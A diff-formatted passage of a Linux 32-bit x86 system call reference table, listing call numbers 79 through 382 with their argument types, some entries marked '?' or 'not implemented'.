+-
+
+
+79.
+settimeofday
+79.
+struct timeval *tv
+struct timezone *tz
+-
+-
+-
+-
+
+
+80.
+getgroups
+80.
+int gidsetsize
+gid_t *grouplist
+-
+-
+-
+-
+
+
+81.
+setgroups
+81.
+int gidsetsize
+gid_t *grouplist
+-
+-
+-
+-
+
+
+82.
+select
+82.
+int n
+fd_set *inp
+fd_set *outp
+fd_set *exp
+struct timeval *tvp
+-
+
+
+83.
+symlink
+83.
+const char *old
+const char *new
+-
+-
+-
+-
+
+
+84.
+oldlstat
+84.
+?
+?
+?
+?
+?
+?
+
+
+85.
+readlink
+85.
+const char *path
+char *buf
+int bufsiz
+-
+-
+-
+
+
+86.
+uselib
+86.
+const char *library
+-
+-
+-
+-
+-
+
+
+87.
+swapon
+87.
+const char *specialfile
+int swap_flags
+-
+-
+-
+-
+
+
+88.
+reboot
+88.
+int magic1
+int magic2
+unsigned int cmd
+void *arg
+-
+-
+
+
+89.
+readdir
+89.
+?
+?
+?
+?
+?
+?
+
+
+90.
+mmap
+90.
+?
+?
+?
+?
+?
+?
+
+
+91.
+munmap
+91.
+unsigned long addr
+size_t len
+-
+-
+-
+-
+
+
+92.
+truncate
+92.
+const char *path
+long length
+-
+-
+-
+-
+
+
+93.
+ftruncate
+93.
+unsigned int fd
+unsigned long length
+-
+-
+-
+-
+
+
+94.
+fchmod
+94.
+unsigned int fd
+umode_t mode
+-
+-
+-
+-
+
+
+95.
+fchown
+95.
+unsigned int fd
+uid_t user
+gid_t group
+-
+-
+-
+
+
+96.
+getpriority
+96.
+int which
+int who
+-
+-
+-
+-
+
+
+97.
+setpriority
+97.
+int which
+int who
+int niceval
+-
+-
+-
+
+
+98.
+profil
+98.
+?
+?
+?
+?
+?
+?
+
+
+99.
+statfs
+99.
+const char * path
+struct statfs *buf
+-
+-
+-
+-
+
+
+100.
+fstatfs
+100.
+unsigned int fd
+struct statfs *buf
+-
+-
+-
+-
+
+
+101.
+ioperm
+101.
+unsigned long from
+unsigned long num
+int on
+-
+-
+-
+
+
+102.
+socketcall
+102.
+int call
+unsigned long *args
+-
+-
+-
+-
+
+
+103.
+syslog
+103.
+int type
+char *buf
+int len
+-
+-
+-
+
+
+104.
+setitimer
+104.
+int which
+struct itimerval *value
+struct itimerval *ovalue
+-
+-
+-
+
+
+105.
+getitimer
+105.
+int which
+struct itimerval *value
+-
+-
+-
+-
+
+
+106.
+stat
+106.
+const char *filename
+struct __old_kernel_stat *statbuf
+-
+-
+-
+-
+
+
+107.
+lstat
+107.
+const char *filename
+struct __old_kernel_stat *statbuf
+-
+-
+-
+-
+
+
+108.
+fstat
+108.
+unsigned int fd
+struct __old_kernel_stat *statbuf
+-
+-
+-
+-
+
+
+109.
+olduname
+109.
+struct oldold_utsname *
+-
+-
+-
+-
+-
+
+
+110.
+iopl
+110.
+?
+?
+?
+?
+?
+?
+
+
+111.
+vhangup
+111.
+-
+-
+-
+-
+-
+-
+
+
+112.
+idle
+112.
+?
+?
+?
+?
+?
+?
+
+
+113.
+vm86old
+113.
+?
+?
+?
+?
+?
+?
+
+
+114.
+wait4
+114.
+pid_t pid
+int *stat_addr
+int options
+struct rusage *ru
+-
+-
+
+
+115.
+swapoff
+115.
+const char *specialfile
+-
+-
+-
+-
+-
+
+
+116.
+sysinfo
+116.
+struct sysinfo *info
+-
+-
+-
+-
+-
+
+
+117.
+ipc
+117.
+unsigned int call
+int first
+unsigned long second
+unsigned long third
+void *ptr
+long fifth
+
+
+118.
+fsync
+118.
+unsigned int fd
+-
+-
+-
+-
+-
+
+
+119.
+sigreturn
+119.
+?
+?
+?
+?
+?
+?
+
+
+120.
+clone
+120.
+unsigned long
+unsigned long
+int *
+int *
+unsigned long
+-
+
+
+121.
+setdomainname
+121.
+char *name
+int len
+-
+-
+-
+-
+
+
+122.
+uname
+122.
+struct old_utsname *
+-
+-
+-
+-
+-
+
+
+123.
+modify_ldt
+123.
+?
+?
+?
+?
+?
+?
+
+
+124.
+adjtimex
+124.
+struct timex *txc_p
+-
+-
+-
+-
+-
+
+
+125.
+mprotect
+125.
+unsigned long start
+size_t len
+unsigned long prot
+-
+-
+-
+
+
+126.
+sigprocmask
+126.
+int how
+old_sigset_t *set
+old_sigset_t *oset
+-
+-
+-
+
+
+127.
+create_module
+127.
+?
+?
+?
+?
+?
+?
+
+
+128.
+init_module
+128.
+void *umod
+unsigned long len
+const char *uargs
+-
+-
+-
+
+
+129.
+delete_module
+129.
+const char *name_user
+unsigned int flags
+-
+-
+-
+-
+
+
+130.
+get_kernel_syms
+130.
+?
+?
+?
+?
+?
+?
+
+
+131.
+quotactl
+131.
+unsigned int cmd
+const char *special
+qid_t id
+void *addr
+-
+-
+
+
+132.
+getpgid
+132.
+pid_t pid
+-
+-
+-
+-
+-
+
+
+133.
+fchdir
+133.
+unsigned int fd
+-
+-
+-
+-
+-
+
+
+134.
+bdflush
+134.
+int func
+long data
+-
+-
+-
+-
+
+
+135.
+sysfs
+135.
+int option
+unsigned long arg1
+unsigned long arg2
+-
+-
+-
+
+
+136.
+personality
+136.
+unsigned int personality
+-
+-
+-
+-
+-
+
+
+137.
+afs_syscall
+137.
+?
+?
+?
+?
+?
+?
+
+
+138.
+setfsuid
+138.
+uid_t uid
+-
+-
+-
+-
+-
+
+
+139.
+setfsgid
+139.
+gid_t gid
+-
+-
+-
+-
+-
+
+
+140.
+_llseek
+140.
+?
+?
+?
+?
+?
+?
+
+
+141.
+getdents
+141.
+unsigned int fd
+struct linux_dirent *dirent
+unsigned int count
+-
+-
+-
+
+
+142.
+_newselect
+142.
+?
+?
+?
+?
+?
+?
+
+
+143.
+flock
+143.
+unsigned int fd
+unsigned int cmd
+-
+-
+-
+-
+
+
+144.
+msync
+144.
+unsigned long start
+size_t len
+int flags
+-
+-
+-
+
+
+145.
+readv
+145.
+unsigned long fd
+const struct iovec *vec
+unsigned long vlen
+-
+-
+-
+
+
+146.
+writev
+146.
+unsigned long fd
+const struct iovec *vec
+unsigned long vlen
+-
+-
+-
+
+
+147.
+getsid
+147.
+pid_t pid
+-
+-
+-
+-
+-
+
+
+148.
+fdatasync
+148.
+unsigned int fd
+-
+-
+-
+-
+-
+
+
+149.
+_sysctl
+149.
+?
+?
+?
+?
+?
+?
+
+
+150.
+mlock
+150.
+unsigned long start
+size_t len
+-
+-
+-
+-
+
+
+151.
+munlock
+151.
+unsigned long start
+size_t len
+-
+-
+-
+-
+
+
+152.
+mlockall
+152.
+int flags
+-
+-
+-
+-
+-
+
+
+153.
+munlockall
+153.
+-
+-
+-
+-
+-
+-
+
+
+154.
+sched_setparam
+154.
+pid_t pid
+struct sched_param *param
+-
+-
+-
+-
+
+
+155.
+sched_getparam
+155.
+pid_t pid
+struct sched_param *param
+-
+-
+-
+-
+
+
+156.
+sched_setscheduler
+156.
+pid_t pid
+int policy
+struct sched_param *param
+-
+-
+-
+
+
+157.
+sched_getscheduler
+157.
+pid_t pid
+-
+-
+-
+-
+-
+
+
+158.
+sched_yield
+158.
+-
+-
+-
+-
+-
+-
+
+
+159.
+sched_get_priority_max
+159.
+int policy
+-
+-
+-
+-
+-
+
+
+160.
+sched_get_priority_min
+160.
+int policy
+-
+-
+-
+-
+-
+
+
+161.
+sched_rr_get_interval
+161.
+pid_t pid
+struct timespec *interval
+-
+-
+-
+-
+
+
+162.
+nanosleep
+162.
+struct __kernel_timespec *rqtp
+struct __kernel_timespec *rmtp
+-
+-
+-
+-
+
+
+163.
+mremap
+163.
+unsigned long addr
+unsigned long old_len
+unsigned long new_len
+unsigned long flags
+unsigned long new_addr
+-
+
+
+164.
+setresuid
+164.
+uid_t ruid
+uid_t euid
+uid_t suid
+-
+-
+-
+
+
+165.
+getresuid
+165.
+uid_t *ruid
+uid_t *euid
+uid_t *suid
+-
+-
+-
+
+
+166.
+vm86
+166.
+?
+?
+?
+?
+?
+?
+
+
+167.
+query_module
+167.
+?
+?
+?
+?
+?
+?
+
+
+168.
+poll
+168.
+struct pollfd *ufds
+unsigned int nfds
+int timeout
+-
+-
+-
+
+
+169.
+nfsservctl
+169.
+?
+?
+?
+?
+?
+?
+
+
+170.
+setresgid
+170.
+gid_t rgid
+gid_t egid
+gid_t sgid
+-
+-
+-
+
+
+171.
+getresgid
+171.
+gid_t *rgid
+gid_t *egid
+gid_t *sgid
+-
+-
+-
+
+
+172.
+prctl
+172.
+int option
+unsigned long arg2
+unsigned long arg3
+unsigned long arg4
+unsigned long arg5
+-
+
+
+173.
+rt_sigreturn
+173.
+?
+?
+?
+?
+?
+?
+
+
+174.
+rt_sigaction
+174.
+int
+const struct sigaction *
+struct sigaction *
+size_t
+-
+-
+
+
+175.
+rt_sigprocmask
+175.
+int how
+sigset_t *set
+sigset_t *oset
+size_t sigsetsize
+-
+-
+
+
+176.
+rt_sigpending
+176.
+sigset_t *set
+size_t sigsetsize
+-
+-
+-
+-
+
+
+177.
+rt_sigtimedwait
+177.
+const sigset_t *uthese
+siginfo_t *uinfo
+const struct timespec *uts
+size_t sigsetsize
+-
+-
+
+
+178.
+rt_sigqueueinfo
+178.
+pid_t pid
+int sig
+siginfo_t *uinfo
+-
+-
+-
+
+
+179.
+rt_sigsuspend
+179.
+sigset_t *unewset
+size_t sigsetsize
+-
+-
+-
+-
+
+
+180.
+pread64
+180.
+unsigned int fd
+char *buf
+size_t count
+loff_t pos
+-
+-
+
+
+181.
+pwrite64
+181.
+unsigned int fd
+const char *buf
+size_t count
+loff_t pos
+-
+-
+
+
+182.
+chown
+182.
+const char *filename
+uid_t user
+gid_t group
+-
+-
+-
+
+
+183.
+getcwd
+183.
+char *buf
+unsigned long size
+-
+-
+-
+-
+
+
+184.
+capget
+184.
+cap_user_header_t header
+cap_user_data_t dataptr
+-
+-
+-
+-
+
+
+185.
+capset
+185.
+cap_user_header_t header
+const cap_user_data_t data
+-
+-
+-
+-
+
+
+186.
+sigaltstack
+186.
+const struct sigaltstack *uss
+struct sigaltstack *uoss
+-
+-
+-
+-
+
+
+187.
+sendfile
+187.
+int out_fd
+int in_fd
+off_t *offset
+size_t count
+-
+-
+
+
+188.
+getpmsg
+188.
+?
+?
+?
+?
+?
+?
+
+
+189.
+putpmsg
+189.
+?
+?
+?
+?
+?
+?
+
+
+190.
+vfork
+190.
+-
+-
+-
+-
+-
+-
+
+
+191.
+ugetrlimit
+191.
+?
+?
+?
+?
+?
+?
+
+
+192.
+mmap2
+192.
+?
+?
+?
+?
+?
+?
+
+
+193.
+truncate64
+193.
+const char *path
+loff_t length
+-
+-
+-
+-
+
+
+194.
+ftruncate64
+194.
+unsigned int fd
+loff_t length
+-
+-
+-
+-
+
+
+195.
+stat64
+195.
+const char *filename
+struct stat64 *statbuf
+-
+-
+-
+-
+
+
+196.
+lstat64
+196.
+const char *filename
+struct stat64 *statbuf
+-
+-
+-
+-
+
+
+197.
+fstat64
+197.
+unsigned long fd
+struct stat64 *statbuf
+-
+-
+-
+-
+
+
+198.
+lchown32
+198.
+?
+?
+?
+?
+?
+?
+
+
+199.
+getuid32
+199.
+?
+?
+?
+?
+?
+?
+
+
+200.
+getgid32
+200.
+?
+?
+?
+?
+?
+?
+
+
+201.
+geteuid32
+201.
+?
+?
+?
+?
+?
+?
+
+
+202.
+getegid32
+202.
+?
+?
+?
+?
+?
+?
+
+
+203.
+setreuid32
+203.
+?
+?
+?
+?
+?
+?
+
+
+204.
+setregid32
+204.
+?
+?
+?
+?
+?
+?
+
+
+205.
+getgroups32
+205.
+?
+?
+?
+?
+?
+?
+
+
+206.
+setgroups32
+206.
+?
+?
+?
+?
+?
+?
+
+
+207.
+fchown32
+207.
+?
+?
+?
+?
+?
+?
+
+
+208.
+setresuid32
+208.
+?
+?
+?
+?
+?
+?
+
+
+209.
+getresuid32
+209.
+?
+?
+?
+?
+?
+?
+
+
+210.
+setresgid32
+210.
+?
+?
+?
+?
+?
+?
+
+
+211.
+getresgid32
+211.
+?
+?
+?
+?
+?
+?
+
+
+212.
+chown32
+212.
+?
+?
+?
+?
+?
+?
+
+
+213.
+setuid32
+213.
+?
+?
+?
+?
+?
+?
+
+
+214.
+setgid32
+214.
+?
+?
+?
+?
+?
+?
+
+
+215.
+setfsuid32
+215.
+?
+?
+?
+?
+?
+?
+
+
+216.
+setfsgid32
+216.
+?
+?
+?
+?
+?
+?
+
+
+217.
+pivot_root
+217.
+const char *new_root
+const char *put_old
+-
+-
+-
+-
+
+
+218.
+mincore
+218.
+unsigned long start
+size_t len
+unsigned char * vec
+-
+-
+-
+
+
+219.
+madvise
+219.
+unsigned long start
+size_t len
+int behavior
+-
+-
+-
+
+
+220.
+getdents64
+220.
+unsigned int fd
+struct linux_dirent64 *dirent
+unsigned int count
+-
+-
+-
+
+
+221.
+fcntl64
+221.
+unsigned int fd
+unsigned int cmd
+unsigned long arg
+-
+-
+-
+
+
+222.
+not implemented
+222.
+
+
+
+
+
+
+
+
+223.
+not implemented
+223.
+
+
+
+
+
+
+
+
+224.
+gettid
+224.
+-
+-
+-
+-
+-
+-
+
+
+225.
+readahead
+225.
+int fd
+loff_t offset
+size_t count
+-
+-
+-
+
+
+226.
+setxattr
+226.
+const char *path
+const char *name
+const void *value
+size_t size
+int flags
+-
+
+
+227.
+lsetxattr
+227.
+const char *path
+const char *name
+const void *value
+size_t size
+int flags
+-
+
+
+228.
+fsetxattr
+228.
+int fd
+const char *name
+const void *value
+size_t size
+int flags
+-
+
+
+229.
+getxattr
+229.
+const char *path
+const char *name
+void *value
+size_t size
+-
+-
+
+
+230.
+lgetxattr
+230.
+const char *path
+const char *name
+void *value
+size_t size
+-
+-
+
+
+231.
+fgetxattr
+231.
+int fd
+const char *name
+void *value
+size_t size
+-
+-
+
+
+232.
+listxattr
+232.
+const char *path
+char *list
+size_t size
+-
+-
+-
+
+
+233.
+llistxattr
+233.
+const char *path
+char *list
+size_t size
+-
+-
+-
+
+
+234.
+flistxattr
+234.
+int fd
+char *list
+size_t size
+-
+-
+-
+
+
+235.
+removexattr
+235.
+const char *path
+const char *name
+-
+-
+-
+-
+
+
+236.
+lremovexattr
+236.
+const char *path
+const char *name
+-
+-
+-
+-
+
+
+237.
+fremovexattr
+237.
+int fd
+const char *name
+-
+-
+-
+-
+
+
+238.
+tkill
+238.
+pid_t pid
+int sig
+-
+-
+-
+-
+
+
+239.
+sendfile64
+239.
+int out_fd
+int in_fd
+loff_t *offset
+size_t count
+-
+-
+
+
+240.
+futex
+240.
+u32 *uaddr
+int op
+u32 val
+struct timespec *utime
+u32 *uaddr2
+u32 val3
+
+
+241.
+sched_setaffinity
+241.
+pid_t pid
+unsigned int len
+unsigned long *user_mask_ptr
+-
+-
+-
+
+
+242.
+sched_getaffinity
+242.
+pid_t pid
+unsigned int len
+unsigned long *user_mask_ptr
+-
+-
+-
+
+
+243.
+set_thread_area
+243.
+?
+?
+?
+?
+?
+?
+
+
+244.
+get_thread_area
+244.
+?
+?
+?
+?
+?
+?
+
+
+245.
+io_setup
+245.
+unsigned nr_reqs
+aio_context_t *ctx
+-
+-
+-
+-
+
+
+246.
+io_destroy
+246.
+aio_context_t ctx
+-
+-
+-
+-
+-
+
+
+247.
+io_getevents
+247.
+aio_context_t ctx_id
+long min_nr
+long nr
+struct io_event *events
+struct timespec *timeout
+-
+
+
+248.
+io_submit
+248.
+aio_context_t
+long
+struct iocb * *
+-
+-
+-
+
+
+249.
+io_cancel
+249.
+aio_context_t ctx_id
+struct iocb *iocb
+struct io_event *result
+-
+-
+-
+
+
+250.
+fadvise64
+250.
+int fd
+loff_t offset
+size_t len
+int advice
+-
+-
+
+
+251.
+not implemented
+251.
+
+
+
+
+
+
+
+
+252.
+exit_group
+252.
+int error_code
+-
+-
+-
+-
+-
+
+
+253.
+lookup_dcookie
+253.
+u64 cookie64
+char *buf
+size_t len
+-
+-
+-
+
+
+254.
+epoll_create
+254.
+int size
+-
+-
+-
+-
+-
+
+
+255.
+epoll_ctl
+255.
+int epfd
+int op
+int fd
+struct epoll_event *event
+-
+-
+
+
+256.
+epoll_wait
+256.
+int epfd
+struct epoll_event *events
+int maxevents
+int timeout
+-
+-
+
+
+257.
+remap_file_pages
+257.
+unsigned long start
+unsigned long size
+unsigned long prot
+unsigned long pgoff
+unsigned long flags
+-
+
+
+258.
+set_tid_address
+258.
+int *tidptr
+-
+-
+-
+-
+-
+
+
+259.
+timer_create
+259.
+clockid_t which_clock
+struct sigevent *timer_event_spec
+timer_t * created_timer_id
+-
+-
+-
+
+
+260.
+timer_settime
+260.
+timer_t timer_id
+int flags
+const struct __kernel_itimerspec *new_setting
+struct itimerspec *old_setting
+-
+-
+
+
+261.
+timer_gettime
+261.
+timer_t timer_id
+struct __kernel_itimerspec *setting
+-
+-
+-
+-
+
+
+262.
+timer_getoverrun
+262.
+timer_t timer_id
+-
+-
+-
+-
+-
+
+
+263.
+timer_delete
+263.
+timer_t timer_id
+-
+-
+-
+-
+-
+
+
+264.
+clock_settime
+264.
+clockid_t which_clock
+const struct __kernel_timespec *tp
+-
+-
+-
+-
+
+
+265.
+clock_gettime
+265.
+clockid_t which_clock
+struct __kernel_timespec *tp
+-
+-
+-
+-
+
+
+266.
+clock_getres
+266.
+clockid_t which_clock
+struct __kernel_timespec *tp
+-
+-
+-
+-
+
+
+267.
+clock_nanosleep
+267.
+clockid_t which_clock
+int flags
+const struct __kernel_timespec *rqtp
+struct __kernel_timespec *rmtp
+-
+-
+
+
+268.
+statfs64
+268.
+const char *path
+size_t sz
+struct statfs64 *buf
+-
+-
+-
+
+
+269.
+fstatfs64
+269.
+unsigned int fd
+size_t sz
+struct statfs64 *buf
+-
+-
+-
+
+
+270.
+tgkill
+270.
+pid_t tgid
+pid_t pid
+int sig
+-
+-
+-
+
+
+271.
+utimes
+271.
+char *filename
+struct timeval *utimes
+-
+-
+-
+-
+
+
+272.
+fadvise64_64
+272.
+int fd
+loff_t offset
+loff_t len
+int advice
+-
+-
+
+
+273.
+vserver
+273.
+?
+?
+?
+?
+?
+?
+
+
+274.
+mbind
+274.
+unsigned long start
+unsigned long len
+unsigned long mode
+const unsigned long *nmask
+unsigned long maxnode
+unsigned flags
+
+
+275.
+get_mempolicy
+275.
+int *policy
+unsigned long *nmask
+unsigned long maxnode
+unsigned long addr
+unsigned long flags
+-
+
+
+276.
+set_mempolicy
+276.
+int mode
+const unsigned long *nmask
+unsigned long maxnode
+-
+-
+-
+
+
+277.
+mq_open
+277.
+const char *name
+int oflag
+umode_t mode
+struct mq_attr *attr
+-
+-
+
+
+278.
+mq_unlink
+278.
+const char *name
+-
+-
+-
+-
+-
+
+
+279.
+mq_timedsend
+279.
+mqd_t mqdes
+const char *msg_ptr
+size_t msg_len
+unsigned int msg_prio
+const struct __kernel_timespec *abs_timeout
+-
+
+
+280.
+mq_timedreceive
+280.
+mqd_t mqdes
+char *msg_ptr
+size_t msg_len
+unsigned int *msg_prio
+const struct __kernel_timespec *abs_timeout
+-
+
+
+281.
+mq_notify
+281.
+mqd_t mqdes
+const struct sigevent *notification
+-
+-
+-
+-
+
+
+282.
+mq_getsetattr
+282.
+mqd_t mqdes
+const struct mq_attr *mqstat
+struct mq_attr *omqstat
+-
+-
+-
+
+
+283.
+kexec_load
+283.
+unsigned long entry
+unsigned long nr_segments
+struct kexec_segment *segments
+unsigned long flags
+-
+-
+
+
+284.
+waitid
+284.
+int which
+pid_t pid
+struct siginfo *infop
+int options
+struct rusage *ru
+-
+
+
+285.
+not implemented
+285.
+
+
+
+
+
+
+
+
+286.
+add_key
+286.
+const char *_type
+const char *_description
+const void *_payload
+size_t plen
+key_serial_t destringid
+-
+
+
+287.
+request_key
+287.
+const char *_type
+const char *_description
+const char *_callout_info
+key_serial_t destringid
+-
+-
+
+
+288.
+keyctl
+288.
+int cmd
+unsigned long arg2
+unsigned long arg3
+unsigned long arg4
+unsigned long arg5
+-
+
+
+289.
+ioprio_set
+289.
+int which
+int who
+int ioprio
+-
+-
+-
+
+
+290.
+ioprio_get
+290.
+int which
+int who
+-
+-
+-
+-
+
+
+291.
+inotify_init
+291.
+-
+-
+-
+-
+-
+-
+
+
+292.
+inotify_add_watch
+292.
+int fd
+const char *path
+u32 mask
+-
+-
+-
+
+
+293.
+inotify_rm_watch
+293.
+int fd
+__s32 wd
+-
+-
+-
+-
+
+
+294.
+migrate_pages
+294.
+pid_t pid
+unsigned long maxnode
+const unsigned long *from
+const unsigned long *to
+-
+-
+
+
+295.
+openat
+295.
+int dfd
+const char *filename
+int flags
+umode_t mode
+-
+-
+
+
+296.
+mkdirat
+296.
+int dfd
+const char * pathname
+umode_t mode
+-
+-
+-
+
+
+297.
+mknodat
+297.
+int dfd
+const char * filename
+umode_t mode
+unsigned dev
+-
+-
+
+
+298.
+fchownat
+298.
+int dfd
+const char *filename
+uid_t user
+gid_t group
+int flag
+-
+
+
+299.
+futimesat
+299.
+int dfd
+const char *filename
+struct timeval *utimes
+-
+-
+-
+
+
+300.
+fstatat64
+300.
+int dfd
+const char *filename
+struct stat64 *statbuf
+int flag
+-
+-
+
+
+301.
+unlinkat
+301.
+int dfd
+const char * pathname
+int flag
+-
+-
+-
+
+
+302.
+renameat
+302.
+int olddfd
+const char * oldname
+int newdfd
+const char * newname
+-
+-
+
+
+303.
+linkat
+303.
+int olddfd
+const char *oldname
+int newdfd
+const char *newname
+int flags
+-
+
+
+304.
+symlinkat
+304.
+const char * oldname
+int newdfd
+const char * newname
+-
+-
+-
+
+
+305.
+readlinkat
+305.
+int dfd
+const char *path
+char *buf
+int bufsiz
+-
+-
+
+
+306.
+fchmodat
+306.
+int dfd
+const char * filename
+umode_t mode
+-
+-
+-
+
+
+307.
+faccessat
+307.
+int dfd
+const char *filename
+int mode
+-
+-
+-
+
+
+308.
+pselect6
+308.
+int
+fd_set *
+fd_set *
+fd_set *
+struct timespec *
+void *
+
+
+309.
+ppoll
+309.
+struct pollfd *
+unsigned int
+struct timespec *
+const sigset_t *
+size_t
+-
+
+
+310.
+unshare
+310.
+unsigned long unshare_flags
+-
+-
+-
+-
+-
+
+
+311.
+set_robust_list
+311.
+struct robust_list_head *head
+size_t len
+-
+-
+-
+-
+
+
+312.
+get_robust_list
+312.
+int pid
+struct robust_list_head * *head_ptr
+size_t *len_ptr
+-
+-
+-
+
+
+313.
+splice
+313.
+int fd_in
+loff_t *off_in
+int fd_out
+loff_t *off_out
+size_t len
+unsigned int flags
+
+
+314.
+sync_file_range
+314.
+int fd
+loff_t offset
+loff_t nbytes
+unsigned int flags
+-
+-
+
+
+315.
+tee
+315.
+int fdin
+int fdout
+size_t len
+unsigned int flags
+-
+-
+
+
+316.
+vmsplice
+316.
+int fd
+const struct iovec *iov
+unsigned long nr_segs
+unsigned int flags
+-
+-
+
+
+317.
+move_pages
+317.
+pid_t pid
+unsigned long nr_pages
+const void * *pages
+const int *nodes
+int *status
+int flags
+
+
+318.
+getcpu
+318.
+unsigned *cpu
+unsigned *node
+struct getcpu_cache *cache
+-
+-
+-
+
+
+319.
+epoll_pwait
+319.
+int epfd
+struct epoll_event *events
+int maxevents
+int timeout
+const sigset_t *sigmask
+size_t sigsetsize
+
+
+320.
+utimensat
+320.
+int dfd
+const char *filename
+struct timespec *utimes
+int flags
+-
+-
+
+
+321.
+signalfd
+321.
+int ufd
+sigset_t *user_mask
+size_t sizemask
+-
+-
+-
+
+
+322.
+timerfd_create
+322.
+int clockid
+int flags
+-
+-
+-
+-
+
+
+323.
+eventfd
+323.
+unsigned int count
+-
+-
+-
+-
+-
+
+
+324.
+fallocate
+324.
+int fd
+int mode
+loff_t offset
+loff_t len
+-
+-
+
+
+325.
+timerfd_settime
+325.
+int ufd
+int flags
+const struct __kernel_itimerspec *utmr
+struct __kernel_itimerspec *otmr
+-
+-
+
+
+326.
+timerfd_gettime
+326.
+int ufd
+struct __kernel_itimerspec *otmr
+-
+-
+-
+-
+
+
+327.
+signalfd4
+327.
+int ufd
+sigset_t *user_mask
+size_t sizemask
+int flags
+-
+-
+
+
+328.
+eventfd2
+328.
+unsigned int count
+int flags
+-
+-
+-
+-
+
+
+329.
+epoll_create1
+329.
+int flags
+-
+-
+-
+-
+-
+
+
+330.
+dup3
+330.
+unsigned int oldfd
+unsigned int newfd
+int flags
+-
+-
+-
+
+
+331.
+pipe2
+331.
+int *fildes
+int flags
+-
+-
+-
+-
+
+
+332.
+inotify_init1
+332.
+int flags
+-
+-
+-
+-
+-
+
+
+333.
+preadv
+333.
+unsigned long fd
+const struct iovec *vec
+unsigned long vlen
+unsigned long pos_l
+unsigned long pos_h
+-
+
+
+334.
+pwritev
+334.
+unsigned long fd
+const struct iovec *vec
+unsigned long vlen
+unsigned long pos_l
+unsigned long pos_h
+-
+
+
+335.
+rt_tgsigqueueinfo
+335.
+pid_t tgid
+pid_t pid
+int sig
+siginfo_t *uinfo
+-
+-
+
+
+336.
+perf_event_open
+336.
+struct perf_event_attr *attr_uptr
+pid_t pid
+int cpu
+int group_fd
+unsigned long flags
+-
+
+
+337.
+recvmmsg
+337.
+int fd
+struct mmsghdr *msg
+unsigned int vlen
+unsigned flags
+struct timespec *timeout
+-
+
+
+338.
+fanotify_init
+338.
+unsigned int flags
+unsigned int event_f_flags
+-
+-
+-
+-
+
+
+339.
+fanotify_mark
+339.
+int fanotify_fd
+unsigned int flags
+u64 mask
+int fd
+const char *pathname
+-
+
+
+340.
+prlimit64
+340.
+pid_t pid
+unsigned int resource
+const struct rlimit64 *new_rlim
+struct rlimit64 *old_rlim
+-
+-
+
+
+341.
+name_to_handle_at
+341.
+int dfd
+const char *name
+struct file_handle *handle
+int *mnt_id
+int flag
+-
+
+
+342.
+open_by_handle_at
+342.
+int mountdirfd
+struct file_handle *handle
+int flags
+-
+-
+-
+
+
+343.
+clock_adjtime
+343.
+clockid_t which_clock
+struct timex *tx
+-
+-
+-
+-
+
+
+344.
+syncfs
+344.
+int fd
+-
+-
+-
+-
+-
+
+
+345.
+sendmmsg
+345.
+int fd
+struct mmsghdr *msg
+unsigned int vlen
+unsigned flags
+-
+-
+
+
+346.
+setns
+346.
+int fd
+int nstype
+-
+-
+-
+-
+
+
+347.
+process_vm_readv
+347.
+pid_t pid
+const struct iovec *lvec
+unsigned long liovcnt
+const struct iovec *rvec
+unsigned long riovcnt
+unsigned long flags
+
+
+348.
+process_vm_writev
+348.
+pid_t pid
+const struct iovec *lvec
+unsigned long liovcnt
+const struct iovec *rvec
+unsigned long riovcnt
+unsigned long flags
+
+
+349.
+kcmp
+349.
+pid_t pid1
+pid_t pid2
+int type
+unsigned long idx1
+unsigned long idx2
+-
+
+
+350.
+finit_module
+350.
+int fd
+const char *uargs
+int flags
+-
+-
+-
+
+
+351.
+sched_setattr
+351.
+pid_t pid
+struct sched_attr *attr
+unsigned int flags
+-
+-
+-
+
+
+352.
+sched_getattr
+352.
+pid_t pid
+struct sched_attr *attr
+unsigned int size
+unsigned int flags
+-
+-
+
+
+353.
+renameat2
+353.
+int olddfd
+const char *oldname
+int newdfd
+const char *newname
+unsigned int flags
+-
+
+
+354.
+seccomp
+354.
+unsigned int op
+unsigned int flags
+const char *uargs
+-
+-
+-
+
+
+355.
+getrandom
+355.
+char *buf
+size_t count
+unsigned int flags
+-
+-
+-
+
+
+356.
+memfd_create
+356.
+const char *uname_ptr
+unsigned int flags
+-
+-
+-
+-
+
+
+357.
+bpf
+357.
+int cmd
+union bpf_attr *attr
+unsigned int size
+-
+-
+-
+
+
+358.
+execveat
+358.
+int dfd
+const char *filename
+const char *const *argv
+const char *const *envp
+int flags
+-
+
+
+359.
+socket
+359.
+int
+int
+int
+-
+-
+-
+
+
+360.
+socketpair
+360.
+int
+int
+int
+int *
+-
+-
+
+
+361.
+bind
+361.
+int
+struct sockaddr *
+int
+-
+-
+-
+
+
+362.
+connect
+362.
+int
+struct sockaddr *
+int
+-
+-
+-
+
+
+363.
+listen
+363.
+int
+int
+-
+-
+-
+-
+
+
+364.
+accept4
+364.
+int
+struct sockaddr *
+int *
+int
+-
+-
+
+
+365.
+getsockopt
+365.
+int fd
+int level
+int optname
+char *optval
+int *optlen
+-
+
+
+366.
+setsockopt
+366.
+int fd
+int level
+int optname
+char *optval
+int optlen
+-
+
+
+367.
+getsockname
+367.
+int
+struct sockaddr *
+int *
+-
+-
+-
+
+
+368.
+getpeername
+368.
+int
+struct sockaddr *
+int *
+-
+-
+-
+
+
+369.
+sendto
+369.
+int
+void *
+size_t
+unsigned
+struct sockaddr *
+int
+
+
+370.
+sendmsg
+370.
+int fd
+struct user_msghdr *msg
+unsigned flags
+-
+-
+-
+
+
+371.
+recvfrom
+371.
+int
+void *
+size_t
+unsigned
+struct sockaddr *
+int *
+
+
+372.
+recvmsg
+372.
+int fd
+struct user_msghdr *msg
+unsigned flags
+-
+-
+-
+
+
+373.
+shutdown
+373.
+int
+int
+-
+-
+-
+-
+
+
+374.
+userfaultfd
+374.
+int flags
+-
+-
+-
+-
+-
+
+
+375.
+membarrier
+375.
+int cmd
+int flags
+-
+-
+-
+-
+
+
+376.
+mlock2
+376.
+unsigned long start
+size_t len
+int flags
+-
+-
+-
+
+
+377.
+copy_file_range
+377.
+int fd_in
+loff_t *off_in
+int fd_out
+loff_t *off_out
+size_t len
+unsigned int flags
+
+
+378.
+preadv2
+378.
+unsigned long fd
+const struct iovec *vec
+unsigned long vlen
+unsigned long pos_l
+unsigned long pos_h
+rwf_t flags
+
+
+379.
+pwritev2
+379.
+unsigned long fd
+const struct iovec *vec
+unsigned long vlen
+unsigned long pos_l
+unsigned long pos_h
+rwf_t flags
+
+
+380.
+pkey_mprotect
+380.
+unsigned long start
+size_t len
+unsigned long prot
+int pkey
+-
+-
+
+
+381.
+pkey_alloc
+381.
+unsigned long flags
+unsigned long init_val
+-
+-
+-
+-
+
+
+382.
